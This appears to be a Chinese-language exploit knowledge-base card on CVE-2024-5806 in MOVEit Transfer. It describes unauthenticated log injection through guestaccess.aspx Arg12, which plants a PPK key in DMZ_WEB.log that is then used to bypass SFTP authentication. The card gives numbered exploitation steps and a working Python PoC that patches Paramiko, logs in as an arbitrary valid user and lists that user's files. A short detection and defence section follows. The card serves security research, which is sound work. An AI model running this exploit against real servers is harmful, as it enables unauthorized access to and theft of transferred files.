---
id: web-generic-auth-moveit-sftp-log-poison-ppk-key-plant
title: MOVEit 无文件利用：guestaccess.aspx Arg12 日志注入 PPK 公钥，SSH 认证直接读取日志文件
type: scenario
domain: web
path: web/generic/auth
technique: moveit-guestaccess-log-poison-ppk-key-plant
tags:
- web
- auth
- moveit
- cve-2024-5806
- log-injection
- ppk
- sftp
- fileless
- key-planting
cve:
- CVE-2024-5806
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: MOVEit Transfer 2023.0 及更新版本；MOVEit Gateway 2024.0 及更新版本（原文 IRC 消息）；修复版本 2024.0.2（SftpServer.exe 16.0.2.57）
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T11:43:04+08:00'
  notes: 已对照原文与图05/06/07核对：guestaccess.aspx Arg12 未认证日志注入、DMZ_WEB.log 可预测路径、60 秒落盘、OpenSSH 失败原因（human.aspx 小写化/需文件开头）、PPK 按行 key:value 宽松解析、私钥含公钥可验签、与空指纹缺陷衔接，均与原文一致；已修正卡片中“日志行不含冒号”的表述（日志行含冒号也会被拆成无关键值对）。未实际复现日志注入/认证；dup-scan 无涉及本卡重复 pair。
url: /docs/web/generic/auth/web-generic-auth-moveit-sftp-log-poison-ppk-key-plant/
draft: false
kb_aliases:
- MOVEit 无文件利用
- CVE-2024-5806 fileless
- guestaccess.aspx Arg12 日志注入
- PPK 公钥植入
- DMZ_WEB.log
- PuTTY-User-Key-File-3
- 日志文件当公钥
---

## 一句话结论

无需登录或上传文件，向 `/guestaccess.aspx` 发送 `transaction=signoff&Arg12=<PPK 私钥>`，即可让 MOVEit 把未修改的 PPK 内容写进可预测的系统日志 `C:\MOVEitTransfer\Logs\DMZ_WEB.log`；等待约 60 秒日志落盘后，在 SFTP 公钥认证中把“公钥路径”指向该日志文件——PPK 解析器按行扫描 `key:value`、跳过不含冒号的日志行，能从夹杂日志文本的文件中加载 PPK 私钥（私钥是公钥的超集，可用于验签），再配合 CVE-2024-5806 的空指纹/缓存缺陷，以任意有效用户名登录。

## 原理

- **日志注入点**：MOVEit Web 应用的 `MOVEit.DMZ.WebApp.SILGuestAccess.GetHTML` 会把 `Arg12` 参数原样拼接进重定向 URL 并记录到日志；`/guestaccess.aspx` 未要求认证，`transaction=signoff` 分支即可触发。POST 体中的换行/键内容会原样进入日志行，因此可以注入整段 PPK 文本。
- **可预测路径与落盘时机**：系统日志位于安装目录的 `Logs\DMZ_WEB.log`（原文 PoC 使用 `C:\MOVEitTransfer\Logs\DMZ_WEB.log`）；默认日志每 60 秒刷新到磁盘，PoC 需要等待约 61 秒确保密钥已写入文件。
- **为什么 OpenSSH 格式失败**：把 OpenSSH 公钥放进 `human.aspx` 的 Username 时，日志会把内容转成小写，破坏 Base64 大小写；而且 OpenSSH 解析器要求文件以 `---- BEGIN SSH2 PUBLIC KEY` 开头，日志中密钥在文件中间会直接失败（`The certificate store could not be opened`）。XML/JWK 等格式同样要求合法文档结构，日志夹带文本无法满足。
- **为什么 PPK 可行**：PPK 加载器把输入按行读入，`Trim()` 后按 `:` 分割成键值对；不含冒号的行直接跳过，不报错。它只查找 `PuTTY-User-Key-File-3`、`Encryption`、`Comment`、`Public-Lines`、`Private-Lines`、`Private-MAC` 等键。日志行即使含冒号（如 `2024-06-19 15:42:33.223 ... GuestAccess_GetHTML: Redirecting ...`），也只会被拆成时间戳、方法名等无关键值对，不会匹配加载器查找的键；不含冒号的行则直接跳过，均不报错；而注入的 `PuTTY-User-Key-File-3: ssh-dss` 等行能被正确解析。PPK 保存的是私钥，但私钥包含公钥信息，服务器用它验证签名没有问题。
- **与核心漏洞衔接**：IPWorks 从日志文件加载 PPK 后仍把空字符串作为公钥指纹传给 MOVEit `Authenticate`，触发“Denied + StatusCode 0 → Indeterminate → 缓存空指纹 → 第二次 Authenticated”的逻辑（详见关联卡）。因此日志注入只解决“如何在无文件上传的情况下放置密钥”，最终冒充任意用户仍依赖空指纹缺陷。
- **攻击价值**：把前置条件从“能上传文件”降为“能发一个未认证 HTTP POST + 等待日志落盘”，在只暴露 Web/SFTP、不开放上传的 MOVEit 部署上尤其危险。

## 触发条件

- 目标 MOVEit Transfer 的 `/guestaccess.aspx` 可未认证访问，`transaction=signoff` 分支可达。
- 日志文件路径可预测且 SFTP 服务进程可读（默认安装目录下的 `Logs\DMZ_WEB.log`）。
- 日志按默认配置定期落盘（约 60 秒），或攻击者能触发立即刷新。
- SFTP 公钥认证启用，攻击者知道有效用户名。
- 目标未升级到修复版本；PPK 加载器保留宽松的按行解析行为。

## 利用步骤

1. **准备 PPK 密钥**：生成 SSH 密钥对并转换为 PPK 格式（`PuTTY-User-Key-File-3: ssh-dss`、`Encryption: none`、`Public-Lines`/`Private-Lines`/`Private-MAC`）。
2. **注入日志**：`POST https://<host>/guestaccess.aspx`，body 为 `transaction=signoff&Arg12=\r\n<PPK 文本>`；`Arg12` 中的换行与 PPK 行会进入日志。
3. **等待落盘**：等待约 61 秒（默认日志刷新间隔），或触发日志刷新。
4. **确认注入**：在日志中看到 `PuTTY-User-Key-File-3:` 等行（需要可读日志；也可通过后续认证是否成功间接确认）。
5. **发起认证**：修改 Paramiko，把公钥路径设为日志文件路径 `C:\MOVEitTransfer\Logs\DMZ_WEB.log`，用 PPK 对应私钥签名，按 CVE-2024-5806 的两步认证流程完成登录。
6. **验证与留证**：列出目标用户家目录文件；记录注入请求、日志片段、认证日志与 SFTP 操作。

## PoC

```python
import time
import requests
import paramiko
from paramiko.auth_handler import AuthHandler

host = "<target host>"
ppkfile = "id.ppk"
ppk_data = open(ppkfile, "r").read()

# 1) 把 PPK 注入到 MOVEit 系统日志（未认证请求）
requests.post(
    f"https://{host}/guestaccess.aspx",
    data={"transaction": "signoff", "Arg12": f"\r\n{ppk_data}"},
    verify=False,
)

# 2) 等待日志刷新到磁盘（默认约 60 秒）
time.sleep(61)

# 3) 让 SFTP 客户端把日志文件路径当作公钥路径
def _get_key_type_and_bits(_, key):
    payload = "C:\\\\MOVEitTransfer\\\\Logs\\\\DMZ_WEB.log"
    if key.public_blob:
        return key.public_blob.key_type, payload
    return key.get_name(), payload

AuthHandler._get_key_type_and_bits = _get_key_type_and_bits

transport = paramiko.Transport((host, 22))
transport.connect(None, "<valid user>",
                  pkey=paramiko.dsskey.DSSKey.from_private_key_file("id.pem"))
sftp = paramiko.SFTPClient.from_transport(transport)
for fi in sftp.listdir_attr("."):
    print(fi.longname)
```

PPK 结构示例（原文）：

```text
PuTTY-User-Key-File-3: ssh-dss
Encryption: none
Comment: watchtowr@watchtowr.com
Public-Lines: 10
AAAAB3NzaC1kc3MAAACBAIrAsIu1tvkRHImLwuv9/OhnHwhPjndOX17quEPJBAcq
...
AzY4ofp+AFdG4m064RsTi2GBR7Tr1WiQmCywPcv6SKBi5roxPCi3x1aotjQnd6JN
Pw==
Private-Lines: 1
AAAAFQ.....................IePlr1g==
Private-MAC: 9ef71.................................................edb1d3fc3e
```

## 变体与关联

- **其他日志注入点**：原文先试 `human.aspx` 的 Username，但日志会把内容小写且密钥不在文件开头，OpenSSH 格式失败；`guestaccess.aspx` 的 `Arg12` 保留大小写且可注入完整 PPK。其他记录原始输入的端点也可能可用。
- **格式选择**：OpenSSH/XML/JWK 都要求文件结构/开头；PPK 的宽松按行解析是此链的关键。若目标只支持 OpenSSH 格式，需要另找能把密钥写到文件开头且不改大小写的原语。
- **日志轮转**：若日志在认证前轮转，注入内容可能被切走；需要重新注入或选择稳定路径。
- **关联**：[[web-generic-auth-moveit-cve-2024-5806-sftp-key-path-empty-fingerprint]]（空指纹认证绕过主体）、[[pentest-initial-access-moveit-sftp-unc-forced-auth-responder]]（UNC 路径另一种密钥放置/强制认证方式）。

## 检测与防御

- **输入处理**：不要记录未过滤的用户输入；对 `Arg12` 等参数做换行/控制字符过滤或编码；重定向 URL 拒绝换行（原文补丁/异常日志已出现 `Redirect URI cannot contain newline characters`，但日志仍写入了内容）。
- **日志安全**：日志目录不应被 SFTP/服务进程当作密钥文件读取；限制服务账户对日志文件的读权限与路径访问；对日志中出现 `---- BEGIN SSH2 PUBLIC KEY`、`PuTTY-User-Key-File-` 等高危内容告警。
- **认证检测**：SFTP 公钥路径指向 `Logs\DMZ_WEB.log` 或其他非密钥目录；同一连接出现空指纹、部分成功、二次认证成功的组合；SftpServer 日志中的证书存储错误。
- **修复**：升级 MOVEit 2024.0.2+；不需要公钥认证时禁用；对 SFTP 用户做 IP 白名单；启用密码/MFA 第二因素；限制 `/guestaccess.aspx` 的匿名访问与日志注入面。
